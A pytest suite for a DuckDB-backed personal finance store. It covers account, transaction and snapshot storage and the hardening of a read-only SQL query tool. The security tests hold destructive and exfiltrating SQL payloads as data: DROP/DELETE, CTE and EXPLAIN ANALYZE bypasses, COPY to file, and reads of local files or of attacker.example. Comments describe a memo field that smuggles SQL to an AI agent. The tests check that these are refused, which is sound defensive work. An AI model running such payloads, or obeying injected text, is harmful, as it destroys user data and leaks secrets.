from __future__ import annotations

from datetime import UTC, datetime, timedelta
from decimal import Decimal
from pathlib import Path

import pytest

from goetta_finance.errors import StoreError
from goetta_finance.models import (
    Account,
    AccountType,
    BalanceSnapshot,
    SyncRun,
    Transaction,
)
from goetta_finance.store.duckdb_store import DuckDBStore


def _utc(year: int, month: int, day: int, hour: int = 12) -> datetime:
    return datetime(year, month, day, hour, tzinfo=UTC)


def _account(id: str = "acc-1", balance: str = "100.00") -> Account:
    return Account(
        id=id,
        org_id="org-1",
        org_name="Test Bank",
        name="Checking 1234",
        currency="USD",
        balance=Decimal(balance),
        available_balance=Decimal(balance),
        balance_date=_utc(2026, 5, 1),
        type=AccountType.CHECKING,
        extra={"foo": "bar"},
    )


def _transaction(id: str, amount: str = "-9.99", account_id: str = "acc-1") -> Transaction:
    return Transaction(
        id=id,
        account_id=account_id,
        posted=_utc(2026, 5, 10),
        amount=Decimal(amount),
        description="Coffee shop",
        payee="Coffee shop",
    )


def test_init_applies_migrations(store: DuckDBStore) -> None:
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0001_init.sql",) in rows


def test_init_is_idempotent(store: DuckDBStore) -> None:
    before_row = store.conn.execute("SELECT COUNT(*) FROM schema_migrations").fetchone()
    assert before_row is not None
    before = before_row[0]
    store.init()
    store.init()
    after_row = store.conn.execute("SELECT COUNT(*) FROM schema_migrations").fetchone()
    assert after_row is not None and after_row[0] == before


def test_upsert_and_get_accounts_round_trip(store: DuckDBStore) -> None:
    acc = _account()
    store.upsert_accounts([acc])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    got = fetched[0]
    assert got.id == acc.id
    assert got.balance == Decimal("100.00")
    assert got.type == AccountType.CHECKING
    assert got.balance_date == _utc(2026, 5, 1)
    assert got.extra == {"foo": "bar"}


def test_upsert_accounts_updates_existing(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(balance="100.00")])
    store.upsert_accounts([_account(balance="250.50")])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].balance == Decimal("250.50")


def test_upsert_transactions_counts_new_vs_updated(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    result = store.upsert_transactions([_transaction("t1"), _transaction("t2")])
    assert result.new == 2
    assert result.updated == 0

    result2 = store.upsert_transactions([_transaction("t1"), _transaction("t3")])
    assert result2.new == 1
    assert result2.updated == 1

    txns = store.get_transactions()
    assert {t.id for t in txns} == {"t1", "t2", "t3"}


def test_upsert_transactions_is_idempotent(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    batch = [_transaction(f"t{i}") for i in range(5)]
    store.upsert_transactions(batch)
    store.upsert_transactions(batch)
    count_row = store.conn.execute("SELECT COUNT(*) FROM transactions").fetchone()
    assert count_row is not None and count_row[0] == 5


def test_balance_snapshot_dedup(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    ts = _utc(2026, 5, 1)
    snap = BalanceSnapshot(account_id="acc-1", balance=Decimal("100.00"), timestamp=ts)
    store.record_balance_snapshot(snap)
    store.record_balance_snapshot(snap)
    history = store.get_balance_history("acc-1", since=_utc(2026, 1, 1))
    assert len(history) == 1
    assert history[0].balance == Decimal("100.00")
    assert history[0].timestamp == ts


def test_record_sync_run_and_last_sync_time(store: DuckDBStore) -> None:
    assert store.last_sync_time() is None

    started = _utc(2026, 5, 1, 6)
    finished = started + timedelta(minutes=2)
    run_id = store.record_sync_run(
        SyncRun(
            started_at=started,
            finished_at=finished,
            accounts_touched=3,
            transactions_new=10,
            transactions_updated=2,
            warnings=["a bank was slow"],
        )
    )
    assert run_id == 1
    assert store.last_sync_time() == finished


def test_get_transactions_filters(store: DuckDBStore) -> None:
    store.upsert_accounts([_account("a1"), _account("a2")])
    txns = [
        Transaction(
            id="t-a1-early",
            account_id="a1",
            posted=_utc(2026, 1, 15),
            amount=Decimal("-1.00"),
            description="x",
        ),
        Transaction(
            id="t-a1-late",
            account_id="a1",
            posted=_utc(2026, 5, 15),
            amount=Decimal("-2.00"),
            description="x",
        ),
        Transaction(
            id="t-a2-late",
            account_id="a2",
            posted=_utc(2026, 5, 16),
            amount=Decimal("-3.00"),
            description="x",
        ),
    ]
    store.upsert_transactions(txns)

    by_account = store.get_transactions(account_id="a1")
    assert {t.id for t in by_account} == {"t-a1-early", "t-a1-late"}

    by_date = store.get_transactions(start=_utc(2026, 5, 1))
    assert {t.id for t in by_date} == {"t-a1-late", "t-a2-late"}

    limited = store.get_transactions(limit=1)
    assert len(limited) == 1


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO accounts (id, name, balance, balance_date) VALUES ('x','x',0,now())",
        "UPDATE accounts SET name='x'",
        "DELETE FROM accounts",
        "CREATE TABLE evil (id INT)",
        "DROP TABLE accounts",
        "ALTER TABLE accounts ADD COLUMN evil INT",
        "SELECT 1; DROP TABLE accounts",
    ],
)
def test_query_sql_rejects_writes(store: DuckDBStore, sql: str) -> None:
    with pytest.raises(StoreError):
        store.query_sql(sql)


def test_query_sql_allows_select(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    result = store.query_sql("SELECT id, balance FROM accounts ORDER BY id")
    assert result == [{"id": "acc-1", "balance": Decimal("100.00")}]


def test_query_sql_strips_comments(store: DuckDBStore) -> None:
    rows = store.query_sql("-- comment\nSELECT 1 AS one")
    assert rows == [{"one": 1}]


def _manual_account(id: str = "MANUAL-abc123", balance: str = "30000.00") -> Account:
    return Account(
        id=id,
        org_id=None,
        org_name="Apple",
        name="Apple Savings",
        currency="USD",
        balance=Decimal(balance),
        available_balance=None,
        balance_date=_utc(2026, 5, 17),
        type=AccountType.SAVINGS,
        extra={},
        is_manual=True,
    )


def test_migration_0002_backward_compat_default_false(store: DuckDBStore) -> None:
    """Existing-style upsert (no is_manual specified) defaults to FALSE.

    Proves the 0002 migration applied with the right default and that callers
    written against the pre-0002 schema (no is_manual in the Account model)
    are not broken — they continue to write non-manual rows transparently.
    """
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0002_manual_accounts.sql",) in rows
    store.upsert_accounts([_account()])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].is_manual is False


def test_upsert_manual_account_round_trip(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    got = fetched[0]
    assert got.id == "MANUAL-abc123"
    assert got.is_manual is True
    assert got.balance == Decimal("30000.00")
    assert got.name == "Apple Savings"


def test_upsert_refuses_to_clobber_manual_with_simplefin_data(store: DuckDBStore) -> None:
    """Pin the data-integrity outcome, not the mechanism.

    Seeds a manual account, attempts to upsert non-manual data with the same
    id, then asserts both (a) the call raised StoreError AND (b) the stored
    row's name, balance, and is_manual are unchanged. A future refactor that
    moves the check to a different layer but preserves data integrity passes;
    a refactor that drops the check silently fails because the row got
    clobbered.
    """
    manual = _manual_account(id="MANUAL-shared-id", balance="30000.00")
    store.upsert_accounts([manual])

    simplefin_collision = _account(id="MANUAL-shared-id", balance="0.01")
    assert simplefin_collision.is_manual is False
    with pytest.raises(StoreError):
        store.upsert_accounts([simplefin_collision])

    fetched = store.get_accounts()
    assert len(fetched) == 1
    survived = fetched[0]
    assert survived.is_manual is True, "manual flag was clobbered"
    assert survived.balance == Decimal("30000.00"), "balance was clobbered"
    assert survived.name == "Apple Savings", "name was clobbered"


def test_delete_account_refuses_non_manual(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    with pytest.raises(StoreError, match="non-manual"):
        store.delete_account("acc-1")
    assert {a.id for a in store.get_accounts()} == {"acc-1"}


def test_delete_account_not_found(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.delete_account("MANUAL-does-not-exist")


def test_delete_account_refuses_when_snapshots_exist_without_cascade(
    store: DuckDBStore,
) -> None:
    store.upsert_accounts([_manual_account()])
    store.record_balance_snapshot(
        BalanceSnapshot(
            account_id="MANUAL-abc123",
            balance=Decimal("30000.00"),
            timestamp=_utc(2026, 5, 17),
        )
    )
    with pytest.raises(StoreError, match="balance snapshots"):
        store.delete_account("MANUAL-abc123", cascade_snapshots=False)
    assert {a.id for a in store.get_accounts()} == {"MANUAL-abc123"}


def test_delete_account_cascades_snapshots(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    for day in (1, 8, 15):
        store.record_balance_snapshot(
            BalanceSnapshot(
                account_id="MANUAL-abc123",
                balance=Decimal("30000.00"),
                timestamp=_utc(2026, 5, day),
            )
        )
    deleted = store.delete_account("MANUAL-abc123", cascade_snapshots=True)
    assert deleted == 3
    assert store.get_accounts() == []
    remaining = store.conn.execute(
        "SELECT COUNT(*) FROM balance_snapshots WHERE account_id = ?",
        ["MANUAL-abc123"],
    ).fetchone()
    assert remaining is not None and remaining[0] == 0


def test_delete_account_returns_zero_when_no_snapshots(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    deleted = store.delete_account("MANUAL-abc123")
    assert deleted == 0
    assert store.get_accounts() == []


def test_migration_0003_backward_compat_default_false(store: DuckDBStore) -> None:
    """0003 backward-compat — existing-style upsert (no is_liability) defaults to FALSE."""
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0003_liabilities.sql",) in rows
    store.upsert_accounts([_account()])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].is_liability is False


def test_upsert_liability_round_trip(store: DuckDBStore) -> None:
    store.upsert_accounts(
        [
            Account(
                id="MANUAL-loan-1",
                org_name="Dept of Education",
                name="Federal Student Loans",
                balance=Decimal("22500.00"),
                balance_date=_utc(2026, 5, 1),
                type=AccountType.LOAN,
                is_manual=True,
                is_liability=True,
            )
        ]
    )
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].is_liability is True
    assert fetched[0].is_manual is True


def test_set_account_liability_flips_flag_on_manual(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    assert store.get_accounts()[0].is_liability is False
    store.set_account_liability("MANUAL-abc123", True)
    assert store.get_accounts()[0].is_liability is True
    store.set_account_liability("MANUAL-abc123", False)
    assert store.get_accounts()[0].is_liability is False


def test_set_account_liability_works_on_simplefin_account(store: DuckDBStore) -> None:
    """is_liability is settable on any account id, not just manual ones.

    Real motivation: SimpleFIN credit cards that the user wants explicitly
    flagged as liabilities even though their balance is already negative
    (so the math doesn't strictly require the flag — but the dashboard
    badge and any future asset/liability split do).
    """
    store.upsert_accounts([_account(id="ACT-real-cc")])
    store.set_account_liability("ACT-real-cc", True)
    fetched = store.get_accounts()
    assert fetched[0].id == "ACT-real-cc"
    assert fetched[0].is_liability is True


def test_set_account_liability_raises_on_unknown_id(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.set_account_liability("MANUAL-does-not-exist", True)


# --- Regression: whitelist-bypassing payloads must still be refused. ---
#
# Scenario: a transaction memo or payee field carries injected SQL. Claude
# reads that field while answering an unrelated question and forwards it to
# sql_query. The leading token (WITH / EXPLAIN) is whitelisted by design —
# these are legitimate analytical prefixes — so the read-only transaction is
# what actually has to stop the embedded mutation.


def test_query_sql_rejects_with_cte_delete(store: DuckDBStore) -> None:
    store.upsert_accounts([_account("victim")])
    with pytest.raises(StoreError):
        store.query_sql("WITH cte AS (SELECT 1) DELETE FROM accounts WHERE id = 'victim'")
    survivors = store.get_accounts()
    assert any(a.id == "victim" for a in survivors)


def test_query_sql_rejects_explain_analyze_insert(store: DuckDBStore) -> None:
    before = len(store.get_accounts())
    with pytest.raises(StoreError):
        store.query_sql(
            "EXPLAIN ANALYZE INSERT INTO accounts "
            "(id, name, balance, balance_date) "
            "VALUES ('injected', 'x', 0, now())"
        )
    after = len(store.get_accounts())
    assert before == after, "EXPLAIN ANALYZE INSERT must not write a row"


def test_query_sql_rejects_explain_analyze_copy_to_file(store: DuckDBStore, tmp_path: Path) -> None:
    """EXPLAIN ANALYZE COPY (SELECT 1) TO 'file' actually runs the COPY,
    writing the file. The read-only transaction does NOT block this
    because COPY writes the filesystem, not the database. The prefix
    whitelist is what stops it — by excluding ``explain`` entirely.

    Pin the *outcome*, not the mechanism: even if a future change
    re-adds ``explain`` to the whitelist (or a clever EXPLAIN variant
    slips through), the file must not appear.
    """
    leak = tmp_path / "leak.csv"
    assert not leak.exists()
    with pytest.raises(StoreError):
        store.query_sql(f"EXPLAIN ANALYZE COPY (SELECT 1) TO '{leak.as_posix()}'")
    assert not leak.exists(), (
        f"EXPLAIN ANALYZE COPY must not write to the filesystem, but "
        f"{leak} appeared. The prefix whitelist failed to reject "
        f"`explain` and the read-only transaction does not stop COPY ... "
        f"TO file."
    )


def test_query_sql_blocks_external_file_read(store: DuckDBStore, tmp_path: Path) -> None:
    """``SELECT * FROM read_csv('any/path')`` is the information-disclosure
    counterpart to the mutation vectors above: a memo-injection payload
    could trick the agent into reading arbitrary local files (e.g.
    ``~/.ssh/id_rsa``). The pre-flight whitelist passes it (``select``
    is allowed) and the read-only transaction doesn't bound the
    filesystem. The DuckDB connection's ``enable_external_access=false``
    setting is what stops it.

    Pin the outcome (no leak), not the mechanism (no assertion on the
    specific error wording). Belt-and-suspenders: the unique sentinel
    content must not surface in the error chain either, in case a
    future DuckDB version echoes file contents in error messages.
    """
    sentinel = tmp_path / "sentinel.txt"
    secret = "do-not-leak-this-uuid-deadbeef-cafe-9988"
    sentinel.write_text(secret + "\n", encoding="utf-8")

    with pytest.raises(StoreError) as exc_info:
        store.query_sql(f"SELECT * FROM read_csv('{sentinel.as_posix()}')")

    chain = str(exc_info.value)
    cause = exc_info.value.__cause__
    if cause is not None:
        chain += " " + str(cause)
    assert secret not in chain, (
        "DuckDB error must not echo the sentinel file contents back through the exception chain"
    )


def test_query_sql_blocks_http_url_read(store: DuckDBStore) -> None:
    """Same control covers the network-exfiltration variant: a payload
    like ``SELECT * FROM read_csv('https://attacker.example/log?d=...')``
    would be a beacon-out vector if external access were enabled. Pin the
    outcome (no network attempt reaches DuckDB's httpfs)."""
    with pytest.raises(StoreError):
        store.query_sql("SELECT * FROM read_csv('https://example.invalid/x.csv')")


def test_query_sql_leaves_connection_in_clean_state(store: DuckDBStore) -> None:
    """A rejected query must not leave the read-only transaction open;
    subsequent writes on the same connection must still succeed."""
    store.upsert_accounts([_account("a1")])
    with pytest.raises(StoreError):
        store.query_sql("WITH cte AS (SELECT 1) DELETE FROM accounts WHERE id = 'a1'")
    # If the transaction were still open in read-only mode this would fail.
    store.upsert_accounts([_account("a2", balance="42.00")])
    ids = {a.id for a in store.get_accounts()}
    assert {"a1", "a2"} <= ids


def test_read_only_store_can_read_but_not_write(store: DuckDBStore, tmp_path: Path) -> None:
    """A second DuckDBStore opened with read_only=True against the same
    file must see the data but refuse any write attempt."""
    store.upsert_accounts([_account("a1", balance="100.00")])
    store.close()  # release the writer handle so the OS-level lock is free

    ro_store = DuckDBStore(store.path, read_only=True)
    try:
        ro_store.init()  # must be a no-op, not a migration attempt
        accounts = ro_store.get_accounts()
        assert {a.id for a in accounts} == {"a1"}

        import duckdb

        with pytest.raises(duckdb.Error):
            ro_store.upsert_accounts([_account("a2")])
    finally:
        ro_store.close()


def test_read_only_store_query_sql_still_works(store: DuckDBStore) -> None:
    store.upsert_accounts([_account("a1", balance="42.00")])
    store.close()

    ro_store = DuckDBStore(store.path, read_only=True)
    try:
        rows = ro_store.query_sql("SELECT id, balance FROM accounts")
        assert rows == [{"id": "a1", "balance": Decimal("42.00")}]
    finally:
        ro_store.close()


# --- query_sql resource-limit hardening (Security audit 2026-05) ---


def test_query_sql_memory_limit_bounds_huge_intermediate(store: DuckDBStore) -> None:
    """A query that would allocate well past the 512MB connect-time cap
    must fail with a DuckDB out-of-memory error rather than OOM-killing
    the daemon. Either ``memory_limit`` or the timeout watchdog catches
    this — both are acceptable bounded failures vs. an OOM-kill."""
    with pytest.raises(StoreError) as exc_info:
        store.query_sql("SELECT count(*) FROM range(0, 10000000000) t1, range(0, 1000) t2")
    msg = str(exc_info.value).lower()
    assert "memory" in msg or "interrupt" in msg or "cancel" in msg, (
        f"unexpected error message: {exc_info.value!r}"
    )


def test_query_sql_timeout_interrupts_long_running(
    store: DuckDBStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A query running past the watchdog timeout must be interrupted.
    Sets a 1s timeout via env var so the test stays fast."""
    monkeypatch.setenv("GOETTA_FINANCE_SQL_TIMEOUT_SECONDS", "1")
    with pytest.raises(StoreError) as exc_info:
        store.query_sql("SELECT count(*) FROM range(0, 100000000000)")
    msg = str(exc_info.value).lower()
    assert "interrupt" in msg or "cancel" in msg or "timeout" in msg, (
        f"timeout did not interrupt cleanly; got: {exc_info.value!r}"
    )


def test_query_sql_normal_query_unaffected_by_resource_limits(
    store: DuckDBStore,
) -> None:
    """Regression: small SELECTs must still work after the memory_limit /
    threads / timeout hardening lands. If this goes red the limits are
    set too tight or the watchdog is firing on legitimate queries."""
    store.upsert_accounts([_account("acc-resource-1", balance="100.00")])
    rows = store.query_sql("SELECT id, balance FROM accounts WHERE id = ?", ["acc-resource-1"])
    assert rows == [{"id": "acc-resource-1", "balance": Decimal("100.00")}]


def test_query_sql_params_binding_for_internal_callers(store: DuckDBStore) -> None:
    """``query_sql`` accepts optional positional params so internal callers
    (web/aggregations.py) can bind values instead of interpolating them
    into the SQL string. Closes the bandit B608 / ruff S608 class of
    finding at the call sites without weakening the read-only transaction
    wrapper."""
    store.upsert_accounts([_account("a1", balance="10.00"), _account("a2", balance="20.00")])
    rows = store.query_sql(
        "SELECT id, balance FROM accounts WHERE id = ? ORDER BY id",
        ["a2"],
    )
    assert rows == [{"id": "a2", "balance": Decimal("20.00")}]
